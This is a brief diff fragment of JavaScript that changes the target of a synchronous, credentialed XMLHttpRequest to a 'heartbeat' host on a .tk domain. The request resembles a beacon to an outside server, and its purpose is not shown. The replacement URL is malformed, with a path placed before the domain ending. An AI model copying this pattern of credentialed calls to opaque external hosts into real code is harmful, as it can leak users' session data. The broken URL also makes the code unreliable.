@@ -17,7 +17,7 @@ var data = "70,71,";
 var xhr = new XMLHttpRequest(); 
 xhr.withCredentials = true;
 
-xhr.open('GET', 'https://heartbeat-get.tk', false);
+xhr.open('GET', 'https://heartbeat-get/beat.txt.tk', false);
 
 xhr.onload = function(e) {
   if (xhr.readyState === 4) {
